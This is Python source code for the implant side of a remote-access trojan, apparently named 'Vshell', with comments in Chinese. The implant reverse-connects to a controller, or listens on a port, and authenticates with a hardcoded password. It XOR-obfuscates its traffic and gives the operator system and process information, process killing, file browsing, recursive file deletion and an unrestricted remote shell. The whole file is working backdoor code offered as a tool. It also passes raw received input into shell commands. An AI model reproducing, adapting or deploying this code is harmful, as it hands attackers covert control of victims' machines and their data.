#!/usr/bin/env python3
# -*- coding: utf-8 -*-
 
# 导入socket库:
import socket
import time
import os
import subprocess

# 变量定义 ACTIVE 是否主动连接控制端 / TEMP 临时文件路径 / SYS 被控端系统类型 / PATH 被控端文件管理当前路径
ACTIVE = 1
IP = '127.0.0.1'
PORT = 9481
PASS = 'AC131'
TEMP = None
SYS =  None
PATH = None

#文字颜色
# 红色 \033[0;31;48m[!]\033[0m
# 绿色 \033[0;32;48m[+]\033[0m
# 黄色 \033[0;33;48m[-]\033[0m

# 主动连接控制端
def Active():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if s.connect_ex((IP, PORT)) != 0:
            s.close()
            time.sleep(15)
        elif PassCheck(s):
            return s
        else:
            s.close()
            time.sleep(15)

# 等待控制端连接
def Passive():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',PORT))
    s.listen(1)
    while True:
        sock, addr = s.accept()
        if PassCheck(sock):
            return sock
            
# 验证
def PassCheck(sock):
    while True:
        cmd = sock.recv(1024)
        if cmd.decode('utf-8') == 'Vshell P%s' %PASS:
            sock.send(b'HiAdmin')
            return True
        else:
            sock.send(b'NoAccess')
            return False

# 加密并发送数据（发送时候分数据主体和结束符End，中间睡0.1是为了分包,主控端需要单独的一个包判断发送结束，我也不知道为啥不睡就会导致两句代码发送一个包，明明之前就ok，心态炸了）
def Send(data,sock):
    ml = len(data)					  #分别得到密钥和明文的长度
    kl = len(PASS)
    key = ml//kl*PASS+PASS[:ml%kl]		  #将密钥复制衔接，使其长度与明文长度一致
    pwd = []
    for i in range(len(key)):
	    pwd.append(chr(ord(key[i])^ord(data[i]))) #一对一异或操作，得到结果,其中,"ord(char)"得到该字符对应的ASCII码,"chr(int)"相反
    data = ''.join(pwd)
    data = data.encode('utf-8')
    sock.send(data)
    time.sleep(0.1)
    sock.send(b'End')

# 获取系统信息
def Getinfo(sock):
    if SYS == 'nt':
        res = subprocess.getoutput('systeminfo')
        res = 'nt@' + res
        Send(res,sock)
        return
    else:
        res = subprocess.getoutput('uname -a')
        res = 'posix@' + res
        Send(res,sock)
        return

# 获取更多信息
def GetMoreinfo(sock,target):
    if target == 'CPU':
        res = subprocess.getoutput('cat /proc/cpuinfo')
    elif target == 'MEM':
        res = subprocess.getoutput('cat /proc/meminfo')
    elif target == 'USB':
        res = subprocess.getoutput('lsusb -tv')
    Send(res,sock)

# 进程信息
def Process(sock):
    if SYS == 'nt':
        res = subprocess.getoutput('tasklist')
        Send(res,sock)
        return
    else:
        res = subprocess.getoutput('ps -aux')
        Send(res,sock)
        return

# Kill进程 by Name
def KillName(sock, command):
    name = command.decode('utf-8').split("||", 1)
    if SYS == 'nt':
        res = subprocess.getoutput('taskkill /f /im %s' % name[1])
        Send('The command has been executed. ' + res, sock)
    else:
        Send('This is Linux OS. Can\'t execute the command.', sock)
    return

# Kill进程 by ID
def KillId(sock, command):
    id = command.decode('utf-8').split("||", 1)
    if SYS == 'nt':
        res = subprocess.getoutput('taskkill /f /pid %s' % id[1])
    else:
        res = subprocess.getoutput('kill -9 %s' % id)
    Send('The command has been executed. ' + res, sock)
    return
    
# 文件列表
def File(sock):
    global PATH
    if SYS == 'nt':
        res = subprocess.getoutput('dir %s' % PATH)
        res = '%s' % PATH + '@V@' + res
        Send(res,sock)
        return
    else:
        res = subprocess.getoutput('ls -l %s' % PATH)
        res = '%s' % PATH + '@V@' + res
        Send(res,sock)
        return

# 父目录
def UpDic(sock):
    global PATH
    try:
        os.chdir('..')
    except:
        pass
    PATH = os.getcwd()
    return

# 子目录
def DownDic(sock, command):
    global PATH
    name = command.decode('utf-8').split("||", 1)
    try:
        os.chdir('%s' % name[1])
    except:
        pass
    PATH = os.getcwd()
    return

# 删除文件
def Del(sock, command):
    name = command.decode('utf-8').split("||", 1)
    if SYS == 'nt':
        os.system('del /F /S /Q %s' % name[1])
        os.system('rd /S /Q %s' % name[1])
    else:
        os.system('rm -rf %s' % name[1])
    return

# 新建文件夹
def Add(sock, command):
    name = command.decode('utf-8').split("||", 1)
    os.system('mkdir %s' % name[1])
    return

# shell
def Shell(sock):
    while True:
        d = sock.recv(1024)
        cmd = d.decode('utf-8')
        if cmd == '4x00':
            break
        else:
            res = subprocess.getoutput('%s' % cmd)
            Send(res,sock)
    return

# 主程序
if ACTIVE == 0:
    s = Passive()
else:
    s = Active()
#系统判断的核心，只能判断win/linux，并且判断不出MacOS，后面命令都是按Linux写的，所以不支持Macos
SYS = os.name
#获取当前工作路径
PATH = os.getcwd()
TEMP = os.getcwd()
#循环接受命令，一级指令为数字，二级为*（一级）x*（二级）
while True:
    d = s.recv(1024)
    if d.startswith(b'0'):
        s.send(b'Bye')
        break
    elif d.startswith(b'1x00'):
        Getinfo(s)
    elif d.startswith(b'1x01'):
        GetMoreinfo(s,'CPU')
    elif d.startswith(b'1x02'):
        GetMoreinfo(s,'MEM')
    elif d.startswith(b'1x03'):
        GetMoreinfo(s,'USB')
    elif d.startswith(b'2x00'):
        Process(s)
    elif d.startswith(b'2x01'):
        KillName(s, d)
    elif d.startswith(b'2x02'):
        KillId(s, d)
    elif d.startswith(b'3x00'):
        File(s)
    elif d.startswith(b'3x01'):
        UpDic(s)
    elif d.startswith(b'3x02'):
        DownDic(s, d)
    elif d.startswith(b'3x03'):
        Del(s, d)
    elif d.startswith(b'3x04'):
        Add(s, d)
    elif d.startswith(b'4'):
        Shell(s)
s.close()